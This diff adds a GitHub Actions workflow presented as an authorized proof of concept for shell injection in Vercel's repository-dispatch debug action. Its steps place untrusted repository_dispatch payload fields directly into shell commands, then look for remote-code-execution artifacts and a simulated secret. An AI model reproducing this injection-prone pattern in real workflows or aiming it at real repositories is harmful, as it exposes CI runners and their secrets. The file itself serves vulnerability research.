@@ -1,0 +1,35 @@
+name: PoC - vercel/repository-dispatch DEBUG action shell injection
+# Authorized security research demonstration of the debug action's shell injection.
+# Sends a crafted repository_dispatch event with malicious payload in multiple fields
+# to identify which sinks actually fire on a real GitHub Actions runner.
+
+on:
+  repository_dispatch:
+    types: [poc-debug-test]
+
+jobs:
+  poc:
+    runs-on: ubuntu-latest
+    env:
+      SIMULATED_SECRET: 'fake-token-for-poc-debug-evidence-67890ZZZ'
+    steps:
+      - name: Show what client_payload contains
+        run: |
+          echo "=== Payload received in workflow context ==="
+          echo "git.ref:       ${{ github.event.client_payload.git.ref }}"
+          echo "git.sha:       ${{ github.event.client_payload.git.sha }}"
+          echo "url:           ${{ github.event.client_payload.url }}"
+          echo "project.name:  ${{ github.event.client_payload.project.name }}"
+          echo "error:         ${{ github.event.client_payload.error }}"
+
+      - name: Invoke vulnerable Vercel debug action
+        uses: vercel/repository-dispatch/actions/debug@v1
+
+      - name: Evidence of RCE
+        if: always()
+        run: |
+          echo "--- looking for RCE artifacts ---"
+          ls -la /tmp/RCE_DEBUG_* 2>&1 || echo "(no artifact found)"
+          echo ""
+          echo "--- SIMULATED_SECRET length ---"
+          echo "SIMULATED_SECRET length: ${#SIMULATED_SECRET}"
